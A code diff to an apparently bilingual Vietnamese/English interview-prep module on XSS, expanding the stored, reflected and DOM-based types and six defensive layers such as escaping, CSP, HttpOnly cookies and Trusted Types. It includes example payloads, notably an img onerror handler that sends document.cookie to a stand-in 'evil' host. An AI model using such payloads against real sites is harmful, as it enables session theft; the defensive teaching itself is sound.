@@ -29,10 +29,63 @@ export default function build(l: Locale): InterviewData {
             "XSS (Cross-Site Scripting) is when an attacker gets their JavaScript into your page, and it runs in other users' browsers with the page's full privileges: reading page data, calling APIs as the user, stealing tokens from localStorage, rewriting the UI to phish passwords.",
           ),
           t(
-            "Stored XSS: script được lưu vào DB (bình luận sản phẩm, tên người dùng) rồi hiển thị cho mọi người xem, nguy hiểm nhất. Reflected XSS: script nằm trong URL hoặc form, server phản chiếu lại ngay vào trang (trang tìm kiếm in lại từ khoá), nạn nhân phải bấm vào link độc. DOM-based XSS: xảy ra hoàn toàn ở frontend, JS đọc dữ liệu (location.hash, query) rồi ghi vào DOM bằng innerHTML.",
-            "Stored XSS: the script is saved in the DB (a product review, a username) and shown to everyone, the most dangerous. Reflected XSS: the script is in a URL or form and the server echoes it straight into the page (a search page printing the query); the victim must click a malicious link. DOM-based XSS: happens entirely in the frontend, JS reads data (location.hash, query) and writes it to the DOM with innerHTML.",
+            "Có 3 loại, khác nhau ở chỗ script độc được lưu ở đâu và đi vào trang bằng đường nào:",
+            "There are 3 types, differing in where the malicious script lives and how it gets into the page:",
           ),
         ],
+        points: [
+          {
+            title: t("1. Stored XSS (lưu trữ)", "1. Stored XSS"),
+            body: t(
+              "script được lưu vào DB (bình luận sản phẩm, tên người dùng, mô tả shop) rồi hiển thị cho mọi người mở trang. Nguy hiểm nhất vì không cần lừa ai bấm link, một lần chèn ảnh hưởng mọi người xem, kể cả admin (Blind XSS: script chạy ở trang quản trị). Ví dụ: bình luận chứa <img src=x onerror=\"fetch('//evil?c='+document.cookie)\">.",
+              "the script is saved in the DB (a product review, a username, a shop description) and shown to everyone who opens the page. The most dangerous: no link to click, one injection hits every viewer, admins included (Blind XSS: the script fires in the admin panel). Example: a review containing <img src=x onerror=\"fetch('//evil?c='+document.cookie)\">.",
+            ),
+            subTitle: t("Cách khắc phục", "How to fix"),
+            sub: [
+              t("Escape khi hiển thị theo đúng ngữ cảnh (HTML, attribute, URL, JS); để React/Vue tự escape bằng {text}", "Escape on output for the right context (HTML, attribute, URL, JS); let React/Vue escape via {text}"),
+              t("Nội dung rich text (bài viết, mô tả có định dạng) phải lọc bằng DOMPurify hoặc thư viện sanitize phía server trước khi lưu và khi hiển thị", "Rich text (posts, formatted descriptions) must go through DOMPurify or a server-side sanitizer before saving and before rendering"),
+              t("Validate đầu vào: giới hạn độ dài, định dạng (tên chỉ cho chữ, số), từ chối thẻ HTML ở trường không cần", "Validate input: length and format limits (names only letters, digits), reject HTML in fields that do not need it"),
+              t("Bật CSP để dù lọt script cũng không chạy; cookie phiên đặt HttpOnly để script không đọc được", "Enable CSP so a leaked script still cannot run; mark session cookies HttpOnly so scripts cannot read them"),
+            ],
+          },
+          {
+            title: t("2. Reflected XSS (phản chiếu)", "2. Reflected XSS"),
+            body: t(
+              "script nằm trong URL hoặc form, server lấy giá trị đó in thẳng vào HTML trả về ngay lập tức, không lưu lại. Nạn nhân phải bấm vào link do kẻ tấn công gửi (email, tin nhắn). Ví dụ: shop.vn/search?q=<script>...</script> và trang in ra \"Kết quả cho: <script>...\".",
+              "the script is in a URL or form field and the server prints that value straight into the HTML response, without storing it. The victim has to click the attacker's link (email, chat). Example: shop.vn/search?q=<script>...</script> and the page prints \"Results for: <script>...\".",
+            ),
+            subTitle: t("Cách khắc phục", "How to fix"),
+            sub: [
+              t("Escape mọi tham số từ URL, query, form trước khi in ra HTML; dùng template engine có auto-escape (EJS <%= %>, Handlebars {{ }}, Go html/template)", "Escape every URL, query and form value before printing it into HTML; use auto-escaping templates (EJS <%= %>, Handlebars {{ }}, Go html/template)"),
+              t("Validate theo whitelist: tham số page chỉ nhận số, sort chỉ nhận vài giá trị cho phép", "Validate against a whitelist: page accepts only numbers, sort only a few allowed values"),
+              t("Đặt Content-Type đúng (application/json cho API) để trình duyệt không hiểu nhầm JSON thành HTML, kèm X-Content-Type-Options: nosniff", "Send the right Content-Type (application/json for APIs) so the browser never treats JSON as HTML, plus X-Content-Type-Options: nosniff"),
+              t("CSP chặn script inline: payload phản chiếu thường là inline nên bị chặn", "CSP blocking inline scripts: reflected payloads are usually inline, so they get blocked"),
+            ],
+          },
+          {
+            title: t("3. DOM-based XSS", "3. DOM-based XSS"),
+            body: t(
+              "xảy ra hoàn toàn ở frontend, server không hề thấy payload. JS đọc dữ liệu từ nguồn người dùng kiểm soát (location.hash, location.search, postMessage, localStorage) rồi ghi vào \"điểm nguy hiểm\" (innerHTML, document.write, eval, setTimeout(chuỗi), href=\"javascript:\"). Ví dụ: el.innerHTML = location.hash.slice(1) với URL shop.vn/#<img src=x onerror=alert(1)>.",
+              "it happens entirely in the frontend; the server never sees the payload. JS reads data from a user-controlled source (location.hash, location.search, postMessage, localStorage) and writes it into a dangerous sink (innerHTML, document.write, eval, setTimeout(string), href=\"javascript:\"). Example: el.innerHTML = location.hash.slice(1) with the URL shop.vn/#<img src=x onerror=alert(1)>.",
+            ),
+            subTitle: t("Cách khắc phục", "How to fix"),
+            sub: [
+              t("Dùng textContent / innerText thay cho innerHTML; trong React tránh dangerouslySetInnerHTML, trong Vue tránh v-html", "Use textContent / innerText instead of innerHTML; avoid dangerouslySetInnerHTML in React and v-html in Vue"),
+              t("Không bao giờ đưa dữ liệu người dùng vào eval, new Function, setTimeout dạng chuỗi", "Never pass user data to eval, new Function or string-form setTimeout"),
+              t("Kiểm tra URL trước khi gán vào href/src: chỉ cho http: và https:, chặn javascript:", "Check URLs before assigning to href/src: allow only http: and https:, block javascript:"),
+              t("Kiểm tra event.origin khi nhận postMessage", "Check event.origin when receiving postMessage"),
+              t("Bật Trusted Types (CSP require-trusted-types-for 'script') để trình duyệt cấm gán chuỗi thô vào innerHTML", "Enable Trusted Types (CSP require-trusted-types-for 'script') so the browser forbids raw strings in innerHTML"),
+            ],
+          },
+        ],
+        table: {
+          head: [t("Loại", "Type"), t("Payload nằm ở", "Payload lives in"), t("Server có thấy?", "Server sees it?"), t("Nạn nhân", "Victims")],
+          rows: [
+            ["Stored", "DB", t("Có", "Yes"), t("Mọi người mở trang", "Everyone who opens the page")],
+            ["Reflected", t("URL / form", "URL / form"), t("Có", "Yes"), t("Người bấm link độc", "Whoever clicks the link")],
+            ["DOM-based", t("URL hash, postMessage...", "URL hash, postMessage..."), t("Thường không", "Usually not"), t("Người bấm link độc", "Whoever clicks the link")],
+          ],
+        },
         diagram: <Flow id="secxss" label="Stored XSS" steps={[
           { title: t("Kẻ tấn công", "Attacker"), sub: t("đăng bình luận chứa <script>", "posts a review with <script>") },
           { title: "DB", sub: t("lưu nguyên văn", "stored as-is") },
@@ -47,15 +100,59 @@ export default function build(l: Locale): InterviewData {
       },
       {
         q: t("Phòng chống XSS thế nào?", "How do you prevent XSS?"),
-        a: [
-          t(
-            "1. Escape đầu ra theo đúng ngữ cảnh: chèn vào HTML thì đổi < > & \" ' thành entity. React, Vue, Angular tự escape khi render {text}, nên phần lớn đã an toàn. 2. Tránh các \"lối thoát\": innerHTML, dangerouslySetInnerHTML, v-html, document.write, eval, href=\"javascript:...\". Bắt buộc phải render HTML người dùng (bài viết rich text) thì lọc bằng DOMPurify trước.",
-            "1. Escape output for its context: when inserting into HTML, turn < > & \" ' into entities. React, Vue and Angular escape {text} automatically, so most code is already safe. 2. Avoid the \"escape hatches\": innerHTML, dangerouslySetInnerHTML, v-html, document.write, eval, href=\"javascript:...\". If you must render user HTML (rich text posts), sanitize it with DOMPurify first.",
-          ),
-          t(
-            "3. CSP (Content-Security-Policy): header báo trình duyệt chỉ chạy script từ nguồn cho phép, chặn script inline; dù bị chèn được thẻ script thì cũng không chạy. 4. Cookie phiên/refresh token đặt HttpOnly để script không đọc được. 5. Validate đầu vào (độ dài, định dạng) như một lớp phụ, nhưng không thay được escape đầu ra.",
-            "3. CSP (Content-Security-Policy): a header telling the browser to run scripts only from allowed sources and block inline scripts; even an injected script tag will not run. 4. Mark session/refresh-token cookies HttpOnly so scripts cannot read them. 5. Validate input (length, format) as an extra layer, but it never replaces output escaping.",
-          ),
+        a: t(
+          "Không có một cách duy nhất; dùng nhiều lớp chồng lên nhau (defense in depth) để lớp này lọt thì lớp sau chặn. Có 6 cách:",
+          "There is no single fix; stack several layers (defense in depth) so one catches what another misses. There are 6 techniques:",
+        ),
+        points: [
+          {
+            title: t("1. Escape đầu ra theo ngữ cảnh", "1. Context-aware output escaping"),
+            body: t(
+              "lớp quan trọng nhất. Chèn vào HTML thì đổi < > & \" ' thành entity; chèn vào attribute, URL, JS thì có quy tắc escape riêng. React, Vue, Angular, Go html/template tự escape, nên dùng đúng cách là đã an toàn phần lớn.",
+              "the most important layer. In HTML turn < > & \" ' into entities; attributes, URLs and JS each have their own rules. React, Vue, Angular and Go html/template escape automatically, so using them properly covers most cases.",
+            ),
+            sub: [t("Chặn cả 3 loại XSS", "Stops all 3 XSS types")],
+          },
+          {
+            title: t("2. Tránh các \"lối thoát\" và sanitize khi bắt buộc", "2. Avoid escape hatches; sanitize when you must"),
+            body: t(
+              "không dùng innerHTML, dangerouslySetInnerHTML, v-html, document.write, eval, href=\"javascript:...\" với dữ liệu người dùng. Bắt buộc render HTML (rich text) thì lọc bằng DOMPurify.",
+              "never feed user data to innerHTML, dangerouslySetInnerHTML, v-html, document.write, eval or href=\"javascript:...\". When HTML must be rendered (rich text), sanitize it with DOMPurify.",
+            ),
+            sub: [t("Chặn chủ yếu DOM-based và Stored", "Mainly stops DOM-based and Stored")],
+          },
+          {
+            title: "3. Content-Security-Policy (CSP)",
+            body: t(
+              "header báo trình duyệt chỉ chạy script từ nguồn cho phép và chặn script inline (dùng nonce cho script hợp lệ). Dù kẻ tấn công chèn được thẻ script, trình duyệt vẫn không chạy.",
+              "a header telling the browser to run scripts only from allowed sources and to block inline scripts (use a nonce for legitimate ones). Even if an attacker injects a script tag, the browser will not run it.",
+            ),
+            sub: [t("Lớp chặn cuối khi escape bị lọt", "The last line of defense when escaping fails")],
+          },
+          {
+            title: t("4. Cookie HttpOnly (và Secure, SameSite)", "4. HttpOnly cookies (plus Secure, SameSite)"),
+            body: t(
+              "cookie phiên và refresh token đặt HttpOnly để document.cookie không đọc được; không lưu token quan trọng trong localStorage.",
+              "set session and refresh-token cookies HttpOnly so document.cookie cannot read them; do not keep important tokens in localStorage.",
+            ),
+            sub: [t("Không chặn XSS, nhưng giảm thiệt hại: script không lấy cắp được phiên", "Does not stop XSS but limits the damage: the script cannot steal the session")],
+          },
+          {
+            title: t("5. Validate đầu vào", "5. Input validation"),
+            body: t(
+              "kiểm tra độ dài, định dạng, whitelist giá trị (số trang chỉ là số, sort chỉ vài giá trị). Là lớp phụ, không thay được escape đầu ra.",
+              "check length, format and allowed values (page is a number, sort is one of a few values). An extra layer; it never replaces output escaping.",
+            ),
+            sub: [t("Giảm bề mặt tấn công cho Stored và Reflected", "Shrinks the attack surface for Stored and Reflected")],
+          },
+          {
+            title: "6. Trusted Types",
+            body: t(
+              "bật bằng CSP require-trusted-types-for 'script'; trình duyệt cấm gán chuỗi thô vào innerHTML và các điểm nguy hiểm, bắt buộc đi qua hàm sanitize đã đăng ký.",
+              "enabled via CSP require-trusted-types-for 'script'; the browser forbids raw strings in innerHTML and other sinks, forcing them through a registered sanitizer.",
+            ),
+            sub: [t("Chặn DOM-based XSS ngay từ trình duyệt", "Blocks DOM-based XSS in the browser itself")],
+          },
         ],
         code: [
           { lang: "tsx", src: `// ${t("An toàn: React tự escape", "Safe: React escapes automatically")}
